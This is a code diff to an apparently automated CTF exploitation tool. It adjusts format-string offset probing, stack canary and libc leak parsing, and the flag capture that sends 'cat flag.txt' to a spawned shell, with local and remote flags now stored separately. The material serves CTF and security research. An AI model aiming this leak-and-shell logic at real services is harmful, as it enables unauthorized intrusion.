@@ -31,6 +31,7 @@ class Against:
         self.ip = ip
         self.port = port
         self.debug = False
+        self.option = ""
 
         self.delimiter = b">>>"
 
@@ -67,6 +68,7 @@ class Against:
             b win
             finish
         """
+        self.option = option
 
         if option == "REMOTE" and self.ip != None and self.port != None:
             return remote(self.ip, self.port)
@@ -329,6 +331,7 @@ class Against:
                 response = p.recvline().strip().split(b".")
                 if response[0].decode() != "(nil)":
                     address = response[0].decode()
+
                     response = response[0].split(b"x")[1]
 
                     canary = re.search(r"0x[a-f0-9]{14}00", address)
@@ -342,10 +345,13 @@ class Against:
                     if libc_leak:
                         self.libc_offset_string = offset_str.split(".")[0]
                         aegis_log.info(f"[{self.binary_name}] Found libc leak at offset {i} with {address}")
+                    
+
+                    if len(response) % 2 == 1:
+                        response = b"0" + response
 
                     hex = [response[i:i+2] for i in range(0, 16, 2)][::-1]
 
-                    #print(hex)
                     try: 
                         new_string = ""
                         for val in hex:
@@ -383,6 +389,8 @@ class Against:
                                 self.flag = string
                             break
                     except Exception as e:
+
+                        print(e)
                         p.close()
                     p.close()
             except Exception as e:
@@ -405,8 +413,9 @@ class Against:
             probe = "AAAAAAAZ%" + str(i) + "$p"
             p.sendline(bytes(probe,"utf-8"))
 
+
             data = p.recvall(timeout=2).decode().strip("\n").split("Z")
-            if data[1] == "0x5a41414141414141":
+            if "0x5a41414141414141" in data[1]:
                 offset = i
                 p.close()
                 break
@@ -465,7 +474,7 @@ class Against:
     def verify_flag(self):
         """Return whether the exploit worked or didn't."""
         if self.recieve_flag() == 1 or self.flag != None:
-            aegis_log.info(f"Exploit works got flag {self.flag}")
+            aegis_log.critical(f"Exploit works got flag {self.flag}")
             return True
         else:
             aegis_log.error(f"Exploit failed")
@@ -475,10 +484,13 @@ class Against:
         """Return the flag after parsing it from the binary."""
         try:
             # Just for safe measures ofc
-            self.process.sendline(b"cat flag.txt")
-            self.process.sendline(b"cat flag.txt")
-            self.process.sendline(b"cat flag.txt")
-            self.process.sendline(b"exit")
+
+            
+            if self.process.poll() == None:
+                self.process.sendline(b"cat flag.txt")
+                self.process.sendline(b"cat flag.txt")
+                self.process.sendline(b"cat flag.txt")
+                self.process.sendline(b"exit")
 
             output = self.process.recvall(timeout=2)
             # Don't want to print big output from format write
@@ -487,8 +499,13 @@ class Against:
             match = self.flag_regex.search(output)
 
             if match:
-                self.flag = self.flag_format.decode("utf-8") + "{" + match.group(1).decode('utf-8') + "}" 
-                aegis_log.info(f"Captured the flag !!! {self.flag}")
+                flag = self.flag_format.decode("utf-8") + "{" + match.group(1).decode('utf-8') + "}" 
+                aegis_log.critical(f"Captured the flag !!! {flag}")
+                if self.option != "REMOTE":
+                    self.flag = flag
+                else:
+                    self.remote_flag = flag
+
                 return 1
             elif b"command not found" in output:
                 aegis_log.error(f"Error from shell command")
